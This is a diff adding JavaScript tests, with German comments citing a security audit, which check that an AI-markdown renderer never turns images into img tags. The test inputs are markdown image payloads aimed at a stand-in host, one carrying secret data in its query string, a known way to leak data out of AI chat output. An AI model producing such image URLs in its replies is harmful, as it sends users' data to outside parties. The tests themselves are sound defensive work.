@@ -60,3 +60,36 @@ test('empty input renders nothing', () => {
     assert.equal(renderAiMarkdown(''), '');
     assert.equal(renderAiMarkdown(null), '');
 });
+
+// Sicherheits-Audit 18.11.2026, H1: Bilder wuerden ihr Ziel ohne Klick laden (Datenabfluss ueber die URL).
+
+test('external images are never rendered', () => {
+    const html = renderAiMarkdown('Fertig. ![](https://fremd.example/p?d=geheim) ![x](//fremd.example/p)');
+
+    assert.ok(!html.includes('<img'), `unerwartetes Bild: ${html}`);
+    assert.ok(!html.includes('src='), html);
+    assert.ok(!html.includes('<a '), `unerwarteter Link: ${html}`);
+});
+
+test('relative images are not rendered either', () => {
+    const html = renderAiMarkdown('![Logo](/storage/logo.png)');
+
+    assert.ok(!html.includes('<img'), `unerwartetes Bild: ${html}`);
+    assert.ok(!html.includes('src='), html);
+    assert.match(html, /Logo/);
+});
+
+test('images inside links are not rendered', () => {
+    const html = renderAiMarkdown('[![Bild](https://fremd.example/p.png)](/projects/1) und [![b](/a.png)](https://fremd.example)');
+
+    assert.ok(!html.includes('<img'), `unerwartetes Bild: ${html}`);
+    assert.ok(!html.includes('src='), html);
+    assert.ok(!html.includes('fremd.example"'), html);
+});
+
+test('reference-style images are not rendered', () => {
+    const html = renderAiMarkdown('![Bild][ref]\n\n[ref]: https://fremd.example/p.png');
+
+    assert.ok(!html.includes('<img'), `unerwartetes Bild: ${html}`);
+    assert.ok(!html.includes('<a '), `unerwarteter Link: ${html}`);
+});
